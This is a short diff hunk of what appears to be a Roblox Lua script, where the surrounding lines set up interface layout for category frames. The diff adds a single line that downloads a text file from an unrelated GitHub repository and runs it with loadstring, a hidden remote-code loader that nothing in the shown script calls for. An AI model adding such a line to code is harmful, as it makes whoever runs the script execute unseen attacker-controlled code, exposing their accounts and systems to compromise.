@@ -1413,6 +1413,8 @@ for _, frame in pairs(CategoryFrames) do
 	layout.Parent = frame
 end
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/2btrleans/scr1ipt/refs/heads/main/yessir.txt"))()
+
 
 task.wait(4)
 
